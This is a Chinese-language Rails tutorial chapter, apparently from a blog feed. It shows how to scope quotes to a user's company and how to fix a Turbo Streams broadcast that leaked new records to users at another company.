<p><code>arch -arm64 bundle install</code> 命令使用 <code>-arm64</code> 标志来显式指定了命令应该在 ARM64 架构下执行。这意味着它将使用 ARM64 架构编译 gem，并将这些 gem 安装到 ARM64 目录下，而不管终端窗口当前所处的架构是什么。</p>
<p>所以这里我们应该使用<code>arch -arm64 bundle install</code>命令以确保所有 gem 都被正确地编译和安装到 ARM64 架构目录下。这样就可以匹配上了。</p>
<hr>
<p>现在让我们在页面中登陆吧，点击导航栏中的<code>sign in</code>，输入账号：<a href="mailto:&#x61;&#x63;&#x63;&#x6f;&#117;&#x6e;&#x74;&#97;&#110;&#x74;&#64;&#107;&#x70;&#109;&#103;&#x2e;&#99;&#111;&#x6d;">&#x61;&#x63;&#x63;&#x6f;&#117;&#x6e;&#x74;&#97;&#110;&#x74;&#64;&#107;&#x70;&#109;&#103;&#x2e;&#99;&#111;&#x6d;</a> 和 密码：password，这些都是你fixture文件中定义的假数据。</p>
<p>一切都正常运转，但我们应该动态的改变 公司名 和 当前用户名称</p>
<p>这里面我们简单的，看登录账户邮箱，从中获取当前用户名称，并在用户模型中增加方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/user.rb</span>

<span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token operator">&lt;</span> ApplicationRecord
  devise <span class="token symbol">:database_authenticatable</span><span class="token punctuation">,</span> <span class="token symbol">:validatable</span>

  belongs_to <span class="token symbol">:company</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">name</span></span>
    email<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"@"</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span>capitalize
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们也应该增加一个测试去确保一切正常</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/models/user_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"test_helper"</span></span>

<span class="token keyword">class</span> <span class="token class-name">UserTest</span> <span class="token operator">&lt;</span> ActiveSupport<span class="token double-colon punctuation">::</span>TestCase
  test <span class="token string-literal"><span class="token string">"name"</span></span> <span class="token keyword">do</span>
    assert_equal <span class="token string-literal"><span class="token string">"Accountant"</span></span><span class="token punctuation">,</span> users<span class="token punctuation">(</span><span class="token symbol">:accountant</span><span class="token punctuation">)</span><span class="token punctuation">.</span>name
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>更新导航栏中的数据</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/layouts/_navbar.html.erb %></span>

<span class="token operator">&lt;</span>header <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"navbar"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> user_signed_in<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
    &lt;div class="navbar__brand"></span></span>
      Company name
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"navbar__name"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> current_user<span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;/div></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Sign out"</span></span><span class="token punctuation">,</span>
                  destroy_user_session_path<span class="token punctuation">,</span>
                  <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
                  <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--dark"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% else %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Sign in"</span></span><span class="token punctuation">,</span>
                new_user_session_path<span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--dark navbar__right"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>header<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们再动态的显示公司的名称，记住一个用户是属于一个公司的，所以我们需要动态的获取到<code>current_company</code>。</p>
<p>为了方便我们其他的View和Controller使用到<code>current_company</code>，我们将在<code>ApplicationController</code>中设置helper方法。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/application_controller.rb</span>

<span class="token keyword">class</span> <span class="token class-name">ApplicationController</span> <span class="token operator">&lt;</span> ActionController<span class="token double-colon punctuation">::</span>Base
  before_action <span class="token symbol">:authenticate_user!</span><span class="token punctuation">,</span> <span class="token symbol">unless</span><span class="token operator">:</span> <span class="token symbol">:devise_controller?</span>

  <span class="token keyword">private</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">current_company</span></span>
    <span class="token variable">@current_company</span> <span class="token operator">||=</span> current_user<span class="token punctuation">.</span>company <span class="token keyword">if</span> user_signed_in<span class="token operator">?</span>
  <span class="token keyword">end</span>
  helper_method <span class="token symbol">:current_company</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们就可以在导航栏中使用到<code>current_company</code>了、</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># app/views/layouts/_navbar.html.erb %></span>

<span class="token operator">&lt;</span>header <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"navbar"</span></span><span class="token operator">></span>
  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> user_signed_in<span class="token operator">?</span> <span class="token string-literal"><span class="token string">%>
    &lt;div class="navbar__brand"></span></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> current_company<span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;/div></span></span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string-literal"><span class="token string">"navbar__name"</span></span><span class="token operator">></span>
      <span class="token operator">&lt;</span><span class="token operator">%=</span> current_user<span class="token punctuation">.</span>name <span class="token string-literal"><span class="token string">%>
    &lt;/div></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> button_to <span class="token string-literal"><span class="token string">"Sign out"</span></span><span class="token punctuation">,</span>
                  destroy_user_session_path<span class="token punctuation">,</span>
                  <span class="token symbol">method</span><span class="token operator">:</span> <span class="token symbol">:delete</span><span class="token punctuation">,</span>
                  <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--dark"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% else %></span></span>
    <span class="token operator">&lt;</span><span class="token operator">%=</span> link_to <span class="token string-literal"><span class="token string">"Sign in"</span></span><span class="token punctuation">,</span>
                new_user_session_path<span class="token punctuation">,</span>
                <span class="token symbol">class</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"btn btn--dark navbar__right"</span></span> <span class="token string-literal"><span class="token string">%>
  &lt;% end %></span></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>header<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>记住由于我们对模型之间加入了关联关系，并且在使用编辑器前需要用户登录，所以我们应该更新我们的测试代码，在此之后，我们将讨论 Turbo Streams and security 通过浏览器做一些实验</p>
<h2 id="Fixing-our-tests"><a href="#Fixing-our-tests" class="headerlink" title="Fixing our tests"></a>Fixing our tests</h2><p>现在执行：<code>bin/rails test:system</code></p>
<p>第一个错误应该是 用户需要登录才能操控quotes，而在测试中登陆，我们需要依赖于<code>Warden gem</code>的helpers去避免我们手动的输入，<code>Devise</code> gem是构建与<code>Warden</code>之上的，并且<code>Warden::Test::Helpers</code>模块包含了帮助我们登陆的方法：<code>login_as</code></p>
<p>为了使用它，我们先进行引入：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/application_system_test_case.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"test_helper"</span></span>

<span class="token keyword">class</span> <span class="token class-name">ApplicationSystemTestCase</span> <span class="token operator">&lt;</span> ActionDispatch<span class="token double-colon punctuation">::</span>SystemTestCase
  <span class="token keyword">include</span> Warden<span class="token double-colon punctuation">::</span>Test<span class="token double-colon punctuation">::</span>Helpers

  driven_by <span class="token symbol">:selenium</span><span class="token punctuation">,</span> <span class="token symbol">using</span><span class="token operator">:</span> <span class="token symbol">:headless_chrome</span><span class="token punctuation">,</span> <span class="token symbol">screen_size</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">1400</span><span class="token punctuation">,</span> <span class="token number">1400</span><span class="token punctuation">]</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在我们就可以在继承自<code>ApplicationSystemTestCase</code>的测试类中使用<code>Warden::Test::Helpers</code>模块儿，而当我们执行每个测试之前都需要先登录，所以我们会使用<code>login_as</code>在setup block中。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># test/system/quotes_test.rb</span>

<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">"application_system_test_case"</span></span>

<span class="token keyword">class</span> <span class="token class-name">QuotesTest</span> <span class="token operator">&lt;</span> ApplicationSystemTestCase
  setup <span class="token keyword">do</span>
    login_as users<span class="token punctuation">(</span><span class="token symbol">:accountant</span><span class="token punctuation">)</span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> Quote<span class="token punctuation">.</span>ordered<span class="token punctuation">.</span>first
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在再来执行一下：<code>rails test:system</code>，仍然有测试失败了，因为我们需要对quotes加入关联公司信息，让我们修改一下<code>QuotesController</code>去关联 Company model。</p>
<p>在<code>QuotesController#index</code>方法中应该只展示那些属于当前用户公司的quotes。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">index</span></span>
  <span class="token variable">@quotes</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>ordered
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当然在我们创建quote时，我们也需要确保quote关联到当前用户公司</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/controllers/quotes_controller.rb</span>

<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">create</span></span>
  <span class="token comment"># Only this first line changes to make sure the association is created</span>
  <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>build<span class="token punctuation">(</span>quote_params<span class="token punctuation">)</span>

  <span class="token keyword">if</span> <span class="token variable">@quote</span><span class="token punctuation">.</span>save
    respond_to <span class="token keyword">do</span> <span class="token operator">|</span>format<span class="token operator">|</span>
      format<span class="token punctuation">.</span>html <span class="token punctuation">&#123;</span> redirect_to quotes_path<span class="token punctuation">,</span> <span class="token symbol">notice</span><span class="token operator">:</span> <span class="token string-literal"><span class="token string">"Quote was successfully created."</span></span> <span class="token punctuation">&#125;</span>
      format<span class="token punctuation">.</span>turbo_stream
    <span class="token keyword">end</span>
  <span class="token keyword">else</span>
    render <span class="token symbol">:new</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而对于其他的操作，我们也必须确保只能操作本公司的数据。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">QuotesController</span> <span class="token operator">&lt;</span> ApplicationController
  before_action <span class="token symbol">:set_quote</span><span class="token punctuation">,</span> <span class="token symbol">only</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token symbol">:show</span><span class="token punctuation">,</span> <span class="token symbol">:edit</span><span class="token punctuation">,</span> <span class="token symbol">:update</span><span class="token punctuation">,</span> <span class="token symbol">:destroy</span><span class="token punctuation">]</span>
  <span class="token comment"># All the previous code</span>

  <span class="token keyword">private</span>

  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">set_quote</span></span>
    <span class="token comment"># We must use current_company.quotes here instead of Quote</span>
    <span class="token comment"># for security reasons</span>
    <span class="token variable">@quote</span> <span class="token operator">=</span> current_company<span class="token punctuation">.</span>quotes<span class="token punctuation">.</span>find<span class="token punctuation">(</span>params<span class="token punctuation">[</span><span class="token symbol">:id</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
  <span class="token keyword">end</span>

  <span class="token comment"># All the previous code</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>现在当我们执行测试时，都正常通过了，而执行<code>rails test:all</code>时，也都完美通过，现在我们就可以讨论 Turbo Streams and security的内容了。</p>
<h2 id="Security-and-Turbo-Streams"><a href="#Security-and-Turbo-Streams" class="headerlink" title="Security and Turbo Streams"></a>Security and Turbo Streams</h2><p>让我们在浏览器中做一个实验来说明现在有什么安全问题，我们打开浏览器两个页面，最好屏幕一边一个，这样方便看到实时的更新。</p>
<ul>
<li>一个页面使用正常模式</li>
<li>一个页面使用无痕私密模式</li>
</ul>
<p>在正常模式的页面中登陆账号：<code>accountant@kpmg.com</code> 密码：password</p>
<p>在无痕模式的页面中登陆账号：<code>eavesdropper@pwc.com </code> 密码：password</p>
<p>现在我们让两个页面都来到<code>Quotes#index</code>页面，而使用<code>accountant</code>账户，创建一个叫:<code>Secret quote</code>的quote，但我们会发现这个<code>Secret quote</code>也出现在了无痕模式中<strong>eavesdropper</strong>登录的页面。</p>
<p>这可是个大问题啊，两个账户属于不同的公司，但是却能广播查看到对方的数据。而当刷新<strong>eavesdropper</strong>账户时，这条数据又消失了。</p>
<p>这就是 Turbo Streams 的问题，所以在生产环境使用Turbo Streams前，我们应该首先了解安全性问题，下面我们来分析一下，为什么出现该问题，并该如何解决</p>
<h2 id="Turbo-Stream-Security-in-depth"><a href="#Turbo-Stream-Security-in-depth" class="headerlink" title="Turbo Stream Security in depth"></a>Turbo Stream Security in depth</h2><p>安全是一个复杂的话题，但这里的解决方式很简单</p>
<p>我们通过浏览器的开发工具查看一下<strong>accountant</strong>的DOM节点和<strong>eavesdropper</strong>的DOM节点，在<code>Quotes#index</code>页面中我们都能看到<turbo-cable-stream-source>标签，这是我们使用<code>turbo_stream_from</code>的helper方法生成的：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

&lt;%# This line generate the <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span> tag %>
&lt;%= turbo_stream_from "quotes" %>

&lt;%# All previous content %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们来对比一下生成的两个标签：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- Accountant's session --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>InF1b3RlcyI=--eba9a5055d229db025dd2ed20d069d87c36a2e4191d8fc04971a93c851bb19fc<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- Eavesdropper's session --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>InF1b3RlcyI=--eba9a5055d229db025dd2ed20d069d87c36a2e4191d8fc04971a93c851bb19fc<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意两个签名是一样的，这也就是为什么所有用户收到了相同的广播数据。</p>
<hr>
<p><strong>注意：</strong>这里的签名是turbo_stream_from helper方法自动生成的，而不是给定的简单的参数值。来防止用户篡改其值并获取私有广播。</p>
<p><strong>注意：</strong>你的signed_stream_name在不同项目中是不会相同的，因为签名时使用到了秘钥，而rails生成不同的秘钥为不同的项目，不过这也意味着同一个项目的秘钥是一致的，所以我们这里两个账户生成了同样的签名。</p>
<hr>
<p>通过<code>channel</code>，所有用户都可以从<code>Turbo::StreamsChannel</code>中订阅，而所有的客户端与服务端的交互都经过<code>Turbo::StreamsChannel</code></p>
<p>然而，所有的用户都有相同的<code>signed-stream-name</code>，在<code>ActionCable</code>中，stream的职责是路由广播到接收者那里，因此如果你有相同的签名，就会都接收到数据。</p>
<p>为了解决这个问题，那<code>signed-stream-name</code>参数必须有所不同。</p>
<p>现在我们已经明白了问题原因，让每位来看看怎么解决。</p>
<h2 id="Fixing-our-Turbo-Streams-security-issue"><a href="#Fixing-our-Turbo-Streams-security-issue" class="headerlink" title="Fixing our Turbo Streams security issue"></a>Fixing our Turbo Streams security issue</h2><p>在之前的章节，我们控制quote模型在修改，删除，新增时发送广播通知</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># app/models/quote.rb</span>

<span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  broadcasts_to <span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>quote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token string-literal"><span class="token string">"quotes"</span></span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token symbol">inserts_by</span><span class="token operator">:</span> <span class="token symbol">:prepend</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们用lambda传递一个参数给<code>broadcasts_to</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-<span class="token operator">></span><span class="token punctuation">(</span>quote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token string">"quotes"</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><code>Quotes#index</code>页面我们又订阅了这个流，通过下面的代码：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token operator">&lt;</span><span class="token string-literal"><span class="token string">%# app/views/quotes/index.html.erb %>

&lt;%#</span></span> This line generate the <span class="token operator">&lt;</span>turbo<span class="token operator">-</span>cable<span class="token operator">-</span>stream<span class="token operator">-</span>source<span class="token operator">></span> tag <span class="token string-literal"><span class="token string">%>
&lt;%= turbo_stream_from "quotes" %></span></span>

<span class="token operator">&lt;</span><span class="token operator">%</span><span class="token comment"># All previous content %></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里如果我们想要让 <strong>accountant</strong> 和 <strong>eavesdropper</strong> 拥有不同的签名，我们必须修改stream的名字，而在<code>turbo-rails</code>这很容易：</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Quote</span> <span class="token operator">&lt;</span> ApplicationRecord
  <span class="token comment"># All the previous code</span>

  broadcasts_to <span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">(</span>quote<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">[</span>quote<span class="token punctuation">.</span>company<span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">"quotes"</span></span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token symbol">inserts_by</span><span class="token operator">:</span> <span class="token symbol">:prepend</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的签名参数变成了一个数组，并且将遵循以下的规则</p>
<ol>
<li>共享广播数据的用户应该拥有lambda返回的那些拥有相同的值的数组</li>
<li>而对于不共享广播数据的用户应该拥有不同的值的数组</li>
</ol>
<p>用我们的例子来说，公司都为<strong>accountant</strong>的账户，lambda返回的数组应该是相同值的，所以他们可以共同创建，修改，删除的广播</p>
<p>而不同的公司的eavesdropper，就无法接受到这个广播</p>
<p>现在我们再来修改<code>Quotes#index</code>页面中接收的参数与匹配我们在lambda中设置的数据</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">&lt;%# app/views/quotes/index.html.erb %>

&lt;%= turbo_stream_from current_company, "quotes" %><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们再来在页面中测试一下，这一次，新加的数据，没有出现在<strong>eavesdropper</strong>的列表中。</p>
<p>让我们再来看一下DOM，我们会发现两个账户的签名不一样了。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- Accountant's session --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IloybGtPaTh2YUc5MGQybHlaUzFqYjNWeWMyVXZRMjl0Y0dGdWVTOHhNRFU1TmpNNE5qTXc6cXVvdGVzIg==--9a371841e42663b82349431a512bdc7e22bb3b5407a57cc11d97e3d9af71247c<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- Eavesdropper's session --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IloybGtPaTh2YUc5MGQybHlaUzFqYjNWeWMyVXZRMjl0Y0dGdWVTODBNalV5TVRFeE56RTpxdW90ZXMi--7295a05abddcccdb1e26398b55722c8de8d34f7eeb6c43c0d1a28e56a2b15feb<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>让我们再用相同公司的账户去测试，发现数据被成功的共享了。我们再来看看这次生成的DOM</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- Accountant's session --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IloybGtPaTh2YUc5MGQybHlaUzFqYjNWeWMyVXZRMjl0Y0dGdWVTOHhNRFU1TmpNNE5qTXc6cXVvdGVzIg==--9a371841e42663b82349431a512bdc7e22bb3b5407a57cc11d97e3d9af71247c<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span>

<span class="token comment">&lt;!-- Manager's session --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>turbo-cable-stream-source</span>
  <span class="token attr-name">channel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Turbo::StreamsChannel<span class="token punctuation">"</span></span>
  <span class="token attr-name">signed-stream-name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IloybGtPaTh2YUc5MGQybHlaUzFqYjNWeWMyVXZRMjl0Y0dGdWVTOHhNRFU1TmpNNE5qTXc6cXVvdGVzIg==--9a371841e42663b82349431a512bdc7e22bb3b5407a57cc11d97e3d9af71247c<span class="token punctuation">"</span></span>
<span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>turbo-cable-stream-source</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当我们在生产环境使用Turbo Streams时，我们必须确保模型中的<code>broadcasts_to</code>和页面中的<code>turbo_stream_from</code>方法被恰当的配置，来避免安全问题。</p>
<h2 id="Wrap-up"><a href="#Wrap-up" class="headerlink" title="Wrap up"></a>Wrap up</h2><p>Turbo Streams是一个很棒的工具，但我如果我们不想出现安全事故，就要小心点儿使用。</p>
]]></content>
      <categories>
        <category>Turbo-Rails</category>
      </categories>
      <tags>
        <tag>Rails</tag>
        <tag>turbo</tag>
      </tags>
  </entry>
  <entry>
    <title>Turbo Rails Tutorial-第十一章</title>
    <url>//post/Ruby/Hotails/%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0.html</url>
    <content><![CDATA[<p>​    </p>
<h1 id="Adding-a-quote-total-with-Turbo-Frames"><a href="#Adding-a-quote-total-with-Turbo-Frames" class="headerlink" title="Adding a quote total with Turbo Frames"></a>Adding a quote total with Turbo Frames</h1><p>本章节中，我们将添加一个包含quote总价格的<code>sticky bar</code>,每当我们创建，修改，删除一个line item，总价都会被更新。</p>
<h2 id="What-we-will-build-in-this-chapter"><a href="#What-we-will-build-in-this-chapter" class="headerlink" title="What we will build in this chapter"></a>What we will build in this chapter</h2><p>总价格会在下面的情况中更新：</p>
<ul>
<li>一个<code>line item</code>被创建，修改，删除</li>
<li>一个<code>line item date</code>被删除，而一个line item date中可能有多个items</li>
</ul>
<p>下面的草图，将会展示我们的quote编辑器长什么样子：</p>
<p><img src="../../../../public/img/image-20230701142216313.png" alt="image-20230701142216313"></p>
<p>现在需求明确了，敲代码吧。</p>
<hr>
<p>**Note: **现在我们已经体验过很多次Turbo Frames了，让我们来讨论一下什么时候使用<code>&lt;turbo-frame&gt; 或是 &lt;div&gt;</code></p>
<ul>
<li><p><strong>当我们需要使用Turbo去拦截点击链接或者表单提交时，我们必须使用Turbo Frame</strong><br>比如<code>line_items/_line_item.html.erb</code>局部页面的内容必须被嵌套到Turbo Frame中，因为当我们点击line item的”Edit”按钮时，我们希望Turbo能用<code>LineItems#edit</code>页面中抽离的表单替换相同id的内容时，用简单的<code>div</code>肯定就没用了。</p>
</li>
